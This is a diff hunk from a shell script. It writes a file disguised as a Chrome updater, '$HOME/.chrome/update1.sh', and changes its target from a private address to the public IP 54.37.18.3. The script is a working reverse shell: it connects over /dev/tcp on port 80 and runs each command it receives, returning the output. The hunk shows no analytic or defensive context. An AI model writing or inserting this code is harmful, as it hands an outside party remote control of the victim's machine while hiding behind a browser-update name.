@@ -9,7 +9,7 @@ mkdir -p "$HOME/.chrome"
 # Create update1.sh script
 cat > "$HOME/.chrome/update1.sh" << 'EOF'
 #!/usr/bin/env bash
-item1="10.10.10.21"
+item1="54.37.18.3"
 item2="80"
 exec 5<>/dev/tcp/$item1/$item2
 cat <&5 | while read line; do $line 2>&5 >&5; done
